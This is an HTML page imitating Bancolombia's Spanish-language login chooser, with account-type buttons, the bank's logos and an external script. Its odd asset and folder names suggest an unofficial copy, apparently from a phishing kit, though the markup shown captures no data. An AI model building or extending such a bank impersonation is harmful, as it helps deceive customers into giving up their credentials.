<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Iniciar sesión</title>
    <link rel="stylesheet" href="stylesbotoco/styles.css">
</head>
<body>
    <div id="loading-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.8); z-index: 9999;">
        <img src="a09q298doaknigif.gif" alt="Cargando" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
    </div>
    <div class="container">
        <header>
            <div style="flex: 1;"></div>
            <div class="logo-container">
                <img src="logo-bancolombia+(1).png" alt="Bancolombia logo" class="logo">
            </div>
            <div style="flex: 1; display: flex; justify-content: flex-end;">
                <button class="exit-button">Salir</button>
            </div>
        </header>

        <main>
            <div class="login-container">
                <h1>Iniciar sesión</h1>
                <p>Elige cómo quieres continuar:</p>
            </div>

            <div class="button-container">
                <a href="#" class="button" data-type="Bancolombia Personas">
                    <div class="button-content">
                        <div class="button-text">
                            <div class="button-title">Bancolombia Personas</div>
                            <div class="button-subtitle">Si manejas cuentas o productos personales.</div>
                        </div>
                    </div>
                    <div class="button-icon yellow-bg">
                        <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <polyline points="9 18 15 12 9 6"></polyline>
                        </svg>
                    </div>
                </a>
                <a href="#" class="button" data-type="Bancolombia A la mano">
                    <div class="button-content">
                        <div class="button-text">
                            <div class="button-title">Bancolombia A la mano</div>
                            <div class="button-subtitle">Si usas esta aplicación.</div>
                        </div>
                    </div>
                    <div class="button-icon orange-bg">
                        <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <polyline points="9 18 15 12 9 6"></polyline>
                        </svg>
                    </div>
                </a>
            </div>
        </main>

        <div class="image-below-buttons">
            <img src="fondo-removebg-preview.png" alt="Fondo debajo de botones">
        </div>

        <footer>
            <div class="footer-content">
                <div class="logo-container-footer">
                    <img src="superinter.png" alt="Logo de Superintendencia" class="footer-logo superintendencia-logo">
                </div>
                <div class="footer-info">
                    <p>&copy; 2024 Bancolombia. Todos los derechos reservados.</p>
                    <div class="footer-links">
                        <a href="#">Términos y condiciones</a> |
                        <a href="#">Política de privacidad</a>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <script src="scriptbotoco/app.js"></script>



</body>
</html>
